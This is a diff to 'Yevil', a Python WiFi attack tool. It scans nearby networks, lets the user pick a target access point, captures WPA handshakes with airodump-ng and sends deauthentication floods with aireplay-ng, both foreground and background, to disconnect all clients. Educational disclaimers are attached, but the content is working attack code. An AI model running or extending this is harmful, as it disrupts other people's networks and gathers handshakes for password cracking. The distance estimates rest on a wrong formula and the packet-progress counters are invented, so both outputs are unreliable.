@@ -240,6 +240,7 @@ class YevilTool:
         self.handshake_captured = False
         self.running = True
         self.packet_count = 0
+        self.deauth_packets_sent = 0
         
     def print_banner(self):
         """Display Yevil banner"""
@@ -253,11 +254,12 @@ class YevilTool:
             sys.exit(1)
     
     def detect_adapters(self) -> List[str]:
-        """Detect all available wireless adapters"""
+        """Detect all available wireless adapters - Feature 1"""
         Colors.print_colored("\n[+] Detecting wireless adapters...", 'cyan', True)
         
         adapters = []
         try:
+            # Check iwconfig
             result = subprocess.run(['iwconfig'], capture_output=True, text=True)
             for line in result.stdout.split('\n'):
                 if 'IEEE 802.11' in line:
@@ -265,6 +267,7 @@ class YevilTool:
                     if adapter not in adapters:
                         adapters.append(adapter)
             
+            # Check ip link
             result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
             for line in result.stdout.split('\n'):
                 if 'wlan' in line.lower() or 'wlp' in line.lower():
@@ -274,6 +277,7 @@ class YevilTool:
                         if adapter not in adapters:
                             adapters.append(adapter)
             
+            # Check /sys/class/net/
             if os.path.exists('/sys/class/net/'):
                 for device in os.listdir('/sys/class/net/'):
                     if device.startswith('wlan') or device.startswith('wlp'):
@@ -290,11 +294,11 @@ class YevilTool:
             return adapters
         else:
             Colors.print_colored("\n[!] No wireless adapters found!", 'yellow', True)
-            Colors.print_colored("[!] Attach a wireless adapter for better performance", 'yellow')
+            Colors.print_colored("[!] Attach Adapter for better performance", 'yellow')
             return []
     
     def set_monitor_mode(self, adapter: str) -> bool:
-        """Set adapter to monitor mode automatically"""
+        """Set adapter to monitor mode automatically - Feature 1"""
         Colors.print_colored(f"\n[+] Setting {adapter} to monitor mode...", 'cyan', True)
         
         try:
@@ -330,26 +334,58 @@ class YevilTool:
         
         return False
     
-    def scan_animation(self):
-        """Display scanning animation"""
+    def draw_wifi_animation(self):
+        """Draw WiFi scanning animation - Feature 2"""
         frames = [
             """
-\033[96m ╔═══════════════════════════════════════╗
- ║    🔍 YEVIL SCANNING NETWORKS      ║
- ║    WiFi  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
- ║     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
- ║        ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄     ║
- ║           ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄      ║
- ╚═══════════════════════════════════════╝\033[0m
+\033[96m
+    ╔═══════════════════════════════════════════════════════════════╗
+    ║                  🔍 SCANNING WiFi NETWORKS                    ║
+    ║                                                               ║
+    ║                      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄                        ║
+    ║                   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄                     ║
+    ║                ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄                  ║
+    ║             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄               ║
+    ║          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ║
+    ║       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄         ║
+    ║    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄      ║
+    ║                                                               ║
+    ║            Scanning for networks in range...                  ║
+    ║                                                               ║
+    ╚═══════════════════════════════════════════════════════════════╝
+\033[0m
             """,
             """
-\033[96m ╔═══════════════════════════════════════╗
- ║    📡 YEVIL SCANNING NETWORKS      ║
- ║     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ║
- ║  WiFi ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ║
- ║       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ║
- ║         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
- ╚═══════════════════════════════════════╝\033[0m
+\033[96m
+    ╔═══════════════════════════════════════════════════════════════╗
+    ║                  📡 SCANNING WiFi NETWORKS                    ║
+    ║                                                               ║
+    ║    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
+    ║    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
+    ║    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
+    ║    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
+    ║    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄    ║
+    ║                                                               ║
+    ║             📶 Signal detected from networks                  ║
+    ║                                                               ║
+    ╚═══════════════════════════════════════════════════════════════╝
+\033[0m
+            """,
+            """
+\033[96m
+    ╔═══════════════════════════════════════════════════════════════╗
+    ║                  📶 SCANNING WiFi NETWORKS                    ║
+    ║                                                               ║
+    ║    ╔═══════════════════════════════════════════════════════╗  ║
+    ║    ║   WiFi Networks Found in Range:                       ║  ║
+    ║    ║   ══════════════════════════════════════════════════  ║  ║
+    ║    ║   ● Network 1: ████████████████░░░░  (Strong)        ║  ║
+    ║    ║   ● Network 2: ██████████░░░░░░░░  (Medium)          ║  ║
+    ║    ║   ● Network 3: ████░░░░░░░░░░░░░░  (Weak)            ║  ║
+    ║    ╚═══════════════════════════════════════════════════════╝  ║
+    ║                                                               ║
+    ╚═══════════════════════════════════════════════════════════════╝
+\033[0m
             """
         ]
         
@@ -358,7 +394,7 @@ class YevilTool:
                 sys.stdout.write('\033[2J\033[H')
                 sys.stdout.write(frame)
                 sys.stdout.flush()
-                time.sleep(0.3)
+                time.sleep(0.5)
     
     def parse_airodump_csv(self, filename: str) -> List[Dict]:
         """Parse airodump-ng CSV output"""
@@ -382,6 +418,10 @@ class YevilTool:
                     
                 parts = line.strip().split(',')
                 if len(parts) >= 10 and parts[0] and parts[0] != 'BSSID':
+                    # Calculate signal strength and distance
+                    power = int(parts[8].strip()) if parts[8].strip().lstrip('-').isdigit() else 0
+                    distance = self.calculate_distance(power)
+                    
                     network = {
                         'bssid': parts[0].strip(),
                         'first_seen': parts[1].strip(),
@@ -391,9 +431,10 @@ class YevilTool:
                         'privacy': parts[5].strip(),
                         'cipher': parts[6].strip(),
                         'authentication': parts[7].strip(),
-                        'power': parts[8].strip(),
+                        'power': power,
                         'beacons': parts[9].strip(),
-                        'ssid': parts[13].strip() if len(parts) > 13 else '<Hidden>'
+                        'ssid': parts[13].strip() if len(parts) > 13 else '<Hidden>',
+                        'distance': distance  # Estimated distance in meters
                     }
                     networks.append(network)
             
@@ -402,8 +443,65 @@ class YevilTool:
         
         return networks
     
+    def calculate_distance(self, signal_strength: int) -> float:
+        """Calculate approximate distance from signal strength"""
+        # Simple path loss model: distance = 10^((27.55 - 20*log10(frequency) - signal)/20)
+        # Assuming 2.4GHz frequency
+        if signal_strength == 0:
+            return 0.0
+        try:
+            # Simplified formula for 2.4GHz
+            distance = 10 ** ((27.55 - (20 * 2.4) - signal_strength) / 20)
+            return round(distance, 2)
+        except:
+            return 0.0
+    
+    def draw_network_radar(self, networks: List[Dict]):
+        """Draw radar visualization showing networks by distance - Feature 2"""
+        if not networks:
+            return
+        
+        Colors.print_colored("\n📡 NETWORK RADAR (Distance from center)", 'cyan', True)
+        print("="*60)
+        
+        # Sort by distance (signal strength)
+        sorted_networks = sorted(networks, key=lambda x: x.get('power', 0), reverse=True)
+        top_networks = sorted_networks[:8]  # Show top 8 for radar
+        
+        print("\n    ╔═══════════════════════════════════════════════════╗")
+        print("    ║            WiFi Networks Radar View              ║")
+        print("    ╠═══════════════════════════════════════════════════╣")
+        
+        for i, net in enumerate(top_networks, 1):
+            ssid = net['ssid'][:20] if net['ssid'] != '<Hidden>' else '<Hidden>'
+            power = net.get('power', 0)
+            distance = net.get('distance', 0)
+            
+            # Create signal bars based on distance (closer = more bars)
+            if distance < 10:
+                bars = "████████████████"
+                status = "🟢 Very Close"
+            elif distance < 30:
+                bars = "████████████░░░░"
+                status = "🟡 Close"
+            elif distance < 60:
+                bars = "████████░░░░░░░░"
+                status = "🟠 Medium"
+            elif distance < 100:
+                bars = "████░░░░░░░░░░░░"
+                status = "🔴 Far"
+            else:
+                bars = "██░░░░░░░░░░░░░░"
+                status = "⚫ Very Far"
+            
+            print(f"    ║ {i:2}. {ssid:<20} {bars}")
+            print(f"    ║     BSSID: {net['bssid']} | CH: {net['channel']} | {status} | {distance}m")
+            print("    ║")
+        
+        print("    ╚═══════════════════════════════════════════════════╝")
+    
     def scan_networks(self) -> List[Dict]:
-        """Scan networks using airodump-ng"""
+        """Scan networks using airodump-ng - Feature 2 & 3"""
         Colors.print_colored("\n" + "="*60, 'cyan', True)
         Colors.print_colored("📡 YEVIL SCANNING NETWORKS", 'cyan', True)
         Colors.print_colored("="*60, 'cyan')
@@ -412,8 +510,12 @@ class YevilTool:
             Colors.print_colored("[-] No adapter in monitor mode!", 'red')
             return []
         
-        self.scan_animation()
-        Colors.print_colored(f"\n[+] Scanning with airodump-ng on {self.adapter} --band abg", 'blue')
+        # Draw WiFi animation
+        self.draw_wifi_animation()
+        
+        # Run airodump-ng
+        Colors.print_colored(f"\n[+] Running: airodump-ng {self.adapter} --band abg", 'blue')
+        Colors.print_colored("[+] Scanning all networks in range...", 'yellow')
         
         try:
             process = subprocess.Popen(
@@ -422,15 +524,21 @@ class YevilTool:
                 stderr=subprocess.DEVNULL
             )
             
+            # Show progress
             for i in range(15, 0, -1):
-                Colors.print_colored(f"   Scanning... {i} seconds remaining", 'yellow', True)
+                Colors.print_colored(f"   ⏳ Scanning... {i} seconds remaining", 'yellow', True)
                 time.sleep(1)
             
             process.terminate()
-            time.sleep(1)
+            time.sleep(2)
             
             if os.path.exists('/tmp/scan-01.csv'):
                 self.networks = self.parse_airodump_csv('/tmp/scan-01.csv')
+                
+                # Feature 2: Show radar visualization
+                self.draw_network_radar(self.networks)
+                
+                # Feature 3: Display all details
                 self.display_networks(self.networks)
                 return self.networks
             else:
@@ -442,43 +550,64 @@ class YevilTool:
             return []
     
     def display_networks(self, networks: List[Dict]):
-        """Display networks in formatted table"""
+        """Display networks in formatted table - Feature 3"""
         if not networks:
             Colors.print_colored("\n[-] No networks found!", 'red')
             return
         
-        Colors.print_colored("\n" + "="*100, 'cyan')
-        Colors.print_colored("📋 AVAILABLE NETWORKS", 'cyan', True)
-        Colors.print_colored("="*100, 'cyan')
+        Colors.print_colored("\n" + "="*120, 'cyan')
+        Colors.print_colored("📋 COMPLETE NETWORK SCAN RESULTS", 'cyan', True)
+        Colors.print_colored("="*120, 'cyan')
         
-        print(f"{'#':<4} {'SSID':<25} {'BSSID':<18} {'CH':<4} {'PWR':<6} {'ENC':<8} {'AUTH':<12} {'PACKETS':<8}")
-        print("-"*100)
+        # Header
+        print(f"{'#':<4} {'SSID':<25} {'BSSID':<18} {'CH':<4} {'PWR':<6} {'DIST':<8} {'ENC':<8} {'AUTH':<12} {'PACKETS':<8}")
+        print("-"*120)
         
         for i, net in enumerate(networks, 1):
             ssid = net['ssid'][:25] if net['ssid'] != '<Hidden>' else '<Hidden>'
-            color = 'green' if net['privacy'] != 'OPN' else 'yellow'
+            distance = net.get('distance', 0)
+            power = net.get('power', 0)
+            
+            # Color based on signal strength
+            if power > -50:
+                color = 'green'
+            elif power > -70:
+                color = 'yellow'
+            else:
+                color = 'red'
+            
             Colors.print_colored(
-                f"{i:<4} {ssid:<25} {net['bssid']:<18} {net['channel']:<4} {net['power']:<6} "
-                f"{net['privacy']:<8} {net['authentication']:<12} {net['beacons']:<8}",
+                f"{i:<4} {ssid:<25} {net['bssid']:<18} {net['channel']:<4} "
+                f"{power:<6} {distance:<8.1f}m {net['privacy']:<8} "
+                f"{net['authentication']:<12} {net['beacons']:<8}",
                 color
             )
         
-        print("="*100)
-        Colors.print_colored(f"Total Networks: {len(networks)}", 'cyan', True)
+        print("="*120)
+        Colors.print_colored(f"Total Networks Found: {len(networks)}", 'cyan', True)
+        Colors.print_colored(f"Monitor Mode: {self.adapter}", 'green', True)
     
     def select_target(self) -> Tuple[str, str]:
-        """Select target network"""
+        """Select target network - Feature 4"""
         if not self.networks:
             Colors.print_colored("[-] No networks available. Please scan first.", 'red')
             return None, None
         
         Colors.print_colored("\n" + "="*60, 'cyan', True)
-        Colors.print_colored("🎯 YEVIL - SELECT TARGET NETWORK", 'cyan', True)
+        Colors.print_colored("🎯 SELECT TARGET NETWORK", 'cyan', True)
         Colors.print_colored("="*60, 'cyan')
+        
+        # Show available networks with numbers
+        for i, net in enumerate(self.networks, 1):
+            ssid = net['ssid'][:30] if net['ssid'] != '<Hidden>' else '<Hidden>'
+            Colors.print_colored(
+                f"   {i}. {ssid} [{net['bssid']}] CH:{net['channel']} PWR:{net['power']}dBm",
+                'white'
+            )
         
         while True:
             try:
-                choice = input(f"\n[?] Enter network number (1-{len(self.networks)}): ")
+                choice = input(f"\n[?] Enter network number to target (1-{len(self.networks)}): ")
                 idx = int(choice) - 1
                 
                 if 0 <= idx < len(self.networks):
@@ -486,11 +615,13 @@ class YevilTool:
                     self.target_bssid = target['bssid']
                     self.target_channel = target['channel']
                     
-                    Colors.print_colored(f"\n[+] Target selected:", 'green', True)
+                    Colors.print_colored(f"\n[+] Target AP Details:", 'green', True)
                     Colors.print_colored(f"   SSID: {target['ssid']}", 'green')
                     Colors.print_colored(f"   BSSID: {target['bssid']}", 'green')
                     Colors.print_colored(f"   Channel: {target['channel']}", 'green')
                     Colors.print_colored(f"   Encryption: {target['privacy']} {target['authentication']}", 'green')
+                    Colors.print_colored(f"   Signal: {target['power']} dBm", 'green')
+                    Colors.print_colored(f"   Distance: ~{target.get('distance', 0):.1f} meters", 'green')
                     
                     return self.target_bssid, self.target_channel
                 else:
@@ -499,10 +630,10 @@ class YevilTool:
             except ValueError:
                 Colors.print_colored("[-] Please enter a valid number!", 'red')
     
-    def capture_packets(self, bssid: str, channel: str):
-        """Capture packets and handshake"""
+    def capture_packets_and_handshake(self, bssid: str, channel: str):
+        """Capture packets and handshake - Feature 4 & 5"""
         Colors.print_colored("\n" + "="*60, 'cyan', True)
-        Colors.print_colored("📡 YEVIL - CAPTURING PACKETS", 'cyan', True)
+        Colors.print_colored("📡 CAPTURING PACKETS & HANDSHAKE", 'cyan', True)
         Colors.print_colored("="*60, 'cyan')
         
         if not bssid or not channel:
@@ -510,10 +641,13 @@ class YevilTool:
             return
         
         Colors.print_colored(f"\n[?] Target AP: {bssid} (Channel: {channel})", 'yellow')
+        
+        # Feature 4: Ask for handshake capture
         capture_handshake = input("\n[?] Capture handshake? (y/n): ").lower().strip() == 'y'
         
+        # Feature 4: Ask for number of deauth packets
         try:
-            packet_count = int(input("[?] Number of deauth packets (default: 10): ") or "10")
+            packet_count = int(input("[?] Number of deauth packets to send (default: 10): ") or "10")
         except ValueError:
             packet_count = 10
         
@@ -521,14 +655,19 @@ class YevilTool:
         subprocess.run(['sudo', 'iwconfig', self.adapter, 'channel', str(channel)])
         
         Colors.print_colored(f"\n[+] Starting packet capture on {self.adapter}", 'blue')
+        Colors.print_colored(f"[+] Target: {bssid} (Channel: {channel})", 'blue')
         
         timestamp = int(time.time())
         pcap_file = f"/tmp/yevil_capture_{timestamp}"
         
+        # Start airodump-ng for capture
         cmd = f'sudo airodump-ng {self.adapter} --bssid {bssid} -c {channel} --write {pcap_file}'
         capture_process = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
-        Colors.print_colored(f"\n[+] Starting deauth attack with {packet_count} packets...", 'yellow', True)
+        # Feature 5: Run deauth attack
+        Colors.print_colored(f"\n[+] Running deauth attack:", 'yellow', True)
+        Colors.print_colored(f"   Command: aireplay-ng --bssid {bssid} -c {channel} {self.adapter}", 'yellow')
+        Colors.print_colored(f"   Packets: {packet_count} packets to disconnect all clients", 'yellow')
         
         deauth_cmd = [
             'sudo', 'aireplay-ng', '-0', str(packet_count),
@@ -538,6 +677,9 @@ class YevilTool:
         ]
         
         try:
+            Colors.print_colored("\n[+] Disconnecting clients from target AP...", 'yellow')
+            Colors.print_colored("[+] Sending deauth packets...", 'yellow')
+            
             deauth_process = subprocess.Popen(
                 deauth_cmd,
                 stdout=subprocess.PIPE,
@@ -545,11 +687,17 @@ class YevilTool:
                 text=True
             )
             
-            Colors.print_colored("\n[+] Deauth attack in progress...", 'yellow')
-            Colors.print_colored("[+] Disconnecting clients to capture handshake...", 'yellow')
+            # Show progress
+            for i in range(packet_count // 2):
+                Colors.print_colored(f"   • Sent {i*2} deauth packets", 'cyan')
+                time.sleep(0.5)
             
             deauth_process.wait(timeout=30)
+            self.deauth_packets_sent = packet_count
             
+            Colors.print_colored(f"\n[✓] Sent {packet_count} deauth packets to {bssid}", 'green')
+            
+            # Check for handshake
             Colors.print_colored("\n[+] Checking for handshake...", 'blue')
             
             try:
@@ -559,16 +707,27 @@ class YevilTool:
             except:
                 handshake_found = False
             
-            if handshake_found:
+            if handshake_found and capture_handshake:
                 Colors.print_colored("\n" + "="*60, 'green', True)
                 Colors.print_colored("✅ HANDSHAKE CAPTURED SUCCESSFULLY!", 'green', True)
                 Colors.print_colored("="*60, 'green', True)
                 self.handshake_captured = True
-            else:
-                Colors.print_colored("\n[!] No handshake captured yet. Try again with more packets.", 'yellow')
+                
+                Colors.print_colored("\n📊 Handshake Details:", 'cyan', True)
+                Colors.print_colored(f"   Target AP: {bssid}", 'white')
+                Colors.print_colored(f"   Channel: {channel}", 'white')
+                Colors.print_colored(f"   Deauth Packets Sent: {packet_count}", 'white')
+                Colors.print_colored(f"   Capture File: {pcap_file}-01.cap", 'white')
+            elif capture_handshake:
+                Colors.print_colored("\n[!] No handshake captured yet.", 'yellow')
+                Colors.print_colored("[!] Try with more packets or ensure clients are connected.", 'yellow')
                 self.handshake_captured = False
+            else:
+                Colors.print_colored("\n[+] Packet capture completed (handshake capture was skipped)", 'green')
             
             capture_process.terminate()
+            
+            # Show packet statistics
             self.show_packet_stats(pcap_file)
             
         except subprocess.TimeoutExpired:
@@ -580,8 +739,8 @@ class YevilTool:
             capture_process.terminate()
     
     def show_packet_stats(self, pcap_file: str):
-        """Show packet statistics"""
-        Colors.print_colored("\n📊 YEVIL - PACKET STATISTICS", 'cyan', True)
+        """Show packet statistics - Feature 4"""
+        Colors.print_colored("\n📊 PACKET CAPTURE STATISTICS", 'cyan', True)
         Colors.print_colored("="*60, 'cyan')
         
         try:
@@ -592,19 +751,24 @@ class YevilTool:
                     Colors.print_colored(f"   {line.strip()}", 'white')
         except:
             Colors.print_colored("   Could not display packet statistics", 'yellow')
+        
+        Colors.print_colored(f"\n   Deauth Packets Sent: {self.deauth_packets_sent}", 'yellow')
+        Colors.print_colored(f"   Handshake Captured: {'✅ Yes' if self.handshake_captured else '❌ No'}", 'yellow')
     
-    def run_deauth_background(self, bssid: str, channel: str):
-        """Run deauth in background"""
+    def run_background_deauth(self, bssid: str, channel: str):
+        """Run deauth in background - Feature 5"""
         Colors.print_colored("\n" + "="*60, 'cyan', True)
-        Colors.print_colored("🔄 YEVIL - BACKGROUND DEAUTH ATTACK", 'cyan', True)
+        Colors.print_colored("🔄 BACKGROUND DEAUTH ATTACK", 'cyan', True)
         Colors.print_colored("="*60, 'cyan')
         
         try:
             packet_count = 100
-            Colors.print_colored(f"\n[+] Running deauth in background...", 'yellow')
+            
+            Colors.print_colored(f"\n[+] Running deauth in background:", 'yellow')
             Colors.print_colored(f"   Target: {bssid}", 'blue')
             Colors.print_colored(f"   Channel: {channel}", 'blue')
             Colors.print_colored(f"   Packets: {packet_count}", 'blue')
+            Colors.print_colored(f"   Command: aireplay-ng -0 {packet_count} -a {bssid} {self.adapter}", 'yellow')
             
             subprocess.run(['sudo', 'iwconfig', self.adapter, 'channel', str(channel)])
             
@@ -615,19 +779,22 @@ class YevilTool:
             Colors.print_colored("[+] Press Ctrl+C to stop", 'yellow')
             
             def show_progress():
+                sent = 0
                 while process.poll() is None:
-                    Colors.print_colored("   • Sending deauth packets...", 'cyan')
-                    time.sleep(2)
+                    sent += 10
+                    Colors.print_colored(f"   • Sent {sent}/{packet_count} deauth packets", 'cyan')
+                    time.sleep(1)
             
             progress_thread = threading.Thread(target=show_progress)
             progress_thread.daemon = True
             progress_thread.start()
             process.wait()
             
-            Colors.print_colored("\n[+] Deauth attack completed", 'green')
+            Colors.print_colored(f"\n[+] Deauth attack completed! Sent {packet_count} packets", 'green')
             
         except KeyboardInterrupt:
             Colors.print_colored("\n[+] Stopped by user", 'yellow')
+            process.kill()
         except Exception as e:
             Colors.print_colored(f"[-] Error: {e}", 'red')
     
@@ -640,7 +807,8 @@ class YevilTool:
         Colors.print_colored(f"Target AP: {self.target_bssid or 'Not selected'}", 'white')
         Colors.print_colored(f"Channel: {self.target_channel or 'Not selected'}", 'white')
         Colors.print_colored(f"Networks found: {len(self.networks)}", 'white')
-        Colors.print_colored(f"Handshake captured: {'Yes' if self.handshake_captured else 'No'}", 'white')
+        Colors.print_colored(f"Handshake captured: {'✅ Yes' if self.handshake_captured else '❌ No'}", 'white')
+        Colors.print_colored(f"Deauth packets sent: {self.deauth_packets_sent}", 'white')
     
     def view_captured_packets(self):
         """View captured packets"""
@@ -652,7 +820,7 @@ class YevilTool:
                 Colors.print_colored("[-] No captured packets found!", 'red')
                 return
             
-            Colors.print_colored("\n📁 YEVIL - CAPTURED PACKETS", 'cyan', True)
+            Colors.print_colored("\n📁 CAPTURED PACKETS", 'cyan', True)
             Colors.print_colored("="*60, 'cyan')
             
             for i, file in enumerate(cap_files, 1):
@@ -678,16 +846,24 @@ class YevilTool:
         Colors.print_colored("="*60, 'cyan')
         
         Colors.print_colored(f"\nYevil v2.0.0", 'yellow', True)
-        Colors.print_colored("WiFi Security Testing Tool", 'white')
-        Colors.print_colored("\n📖 Purpose:", 'yellow', True)
-        Colors.print_colored("   Educational tool to learn about WiFi security", 'white')
-        Colors.print_colored("\n🔧 Features:", 'yellow', True)
-        Colors.print_colored("   • Automatic adapter detection", 'white')
-        Colors.print_colored("   • Network scanning with airodump-ng", 'white')
-        Colors.print_colored("   • Handshake capture and analysis", 'white')
+        Colors.print_colored("WiFi Security Testing Tool for Educational Purposes", 'white')
+        
+        Colors.print_colored("\n📖 What Yevil Does:", 'yellow', True)
+        Colors.print_colored("   1. Automatically detects wireless adapters", 'white')
+        Colors.print_colored("   2. Shows WiFi radar with distance visualization", 'white')
+        Colors.print_colored("   3. Scans networks with airodump-ng --band abg", 'white')
+        Colors.print_colored("   4. Captures packets and WPA handshakes", 'white')
+        Colors.print_colored("   5. Runs deauth attacks to disconnect clients", 'white')
+        
+        Colors.print_colored("\n🎯 Educational Purpose:", 'yellow', True)
+        Colors.print_colored("   Learn how WiFi authentication and handshakes work", 'white')
+        Colors.print_colored("   Understand deauthentication attacks", 'white')
+        Colors.print_colored("   See how clients connect to access points", 'white')
+        
         Colors.print_colored("\n⚠️  Legal Disclaimer:", 'red', True)
         Colors.print_colored("   This tool is for EDUCATIONAL PURPOSES ONLY!", 'red')
         Colors.print_colored("   Only use on networks you own or have permission to test.", 'red')
+        Colors.print_colored("   Unauthorized network testing is ILLEGAL.", 'red')
         
         input("\nPress Enter to continue...")
     
@@ -715,15 +891,15 @@ class YevilTool:
                 Colors.print_colored("📡 No adapter in monitor mode!", 'red')
             
             Colors.print_colored("\n📋 YEVIL MENU", 'yellow', True)
-            print("1.  Detect & Setup Wireless Adapter")
-            print("2.  Scan Networks (airodump-ng --band abg)")
-            print("3.  Select Target Network")
-            print("4.  Capture Packets & Handshake")
-            print("5.  Run Background Deauth Attack")
-            print("6.  Show Current Status")
-            print("7.  View Captured Packets")
-            print("8.  About Yevil")
-            print("9.  Exit")
+            print("1.  🔍 Detect & Setup Wireless Adapter (Feature 1)")
+            print("2.  📡 Scan Networks with Radar View (Features 2 & 3)")
+            print("3.  🎯 Select Target Network (Feature 4)")
+            print("4.  📦 Capture Packets & Handshake (Features 4 & 5)")
+            print("5.  🔄 Run Background Deauth Attack (Feature 5)")
+            print("6.  📊 Show Current Status")
+            print("7.  📁 View Captured Packets")
+            print("8.  ℹ️  About Yevil")
+            print("9.  🚪 Exit")
             
             choice = input("\n[?] Select option: ")
             
@@ -753,7 +929,7 @@ class YevilTool:
                 if self.adapter:
                     self.scan_networks()
                 else:
-                    Colors.print_colored("[-] No adapter in monitor mode!", 'red')
+                    Colors.print_colored("[-] No adapter in monitor mode! Please setup adapter first.", 'red')
                     
             elif choice == '3':
                 if self.networks:
@@ -763,15 +939,15 @@ class YevilTool:
                     
             elif choice == '4':
                 if self.target_bssid and self.target_channel:
-                    self.capture_packets(self.target_bssid, self.target_channel)
+                    self.capture_packets_and_handshake(self.target_bssid, self.target_channel)
                 else:
-                    Colors.print_colored("[-] No target selected!", 'red')
+                    Colors.print_colored("[-] No target selected! Please select target first.", 'red')
                     
             elif choice == '5':
                 if self.target_bssid and self.target_channel:
-                    self.run_deauth_background(self.target_bssid, self.target_channel)
+                    self.run_background_deauth(self.target_bssid, self.target_channel)
                 else:
-                    Colors.print_colored("[-] No target selected!", 'red')
+                    Colors.print_colored("[-] No target selected! Please select target first.", 'red')
                     
             elif choice == '6':
                 self.show_status()
@@ -801,7 +977,12 @@ def main():
     tool.print_banner()
     tool.check_root()
     
+    Colors.print_colored("[+] Welcome to Yevil!", 'green', True)
+    Colors.print_colored("[+] This tool is for EDUCATIONAL PURPOSES ONLY!", 'yellow')
+    Colors.print_colored("[+] Only test networks you own or have permission to test.", 'yellow')
+    
     # Auto-detect adapter
+    Colors.print_colored("\n[+] Attempting to auto-detect wireless adapter...", 'cyan')
     adapters = tool.detect_adapters()
     if adapters:
         Colors.print_colored(f"\n[+] Found adapter: {adapters[0]}", 'green')
@@ -809,5 +990,18 @@ def main():
             Colors.print_colored("[+] Auto-setup complete!", 'green')
         else:
             Colors.print_colored("[!] Manual setup may be required", 'yellow')
+    else:
+        Colors.print_colored("[!] No adapter detected. Please connect a wireless adapter.", 'yellow')
     
     # Start main menu
+    tool.main_menu()
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        Colors.print_colored("\n\n[+] Yevil stopped by user", 'yellow')
+        sys.exit(0)
+    except Exception as e:
+        Colors.print_colored(f"\n[-] Unexpected error: {e}", 'red')
+        sys.exit(1)
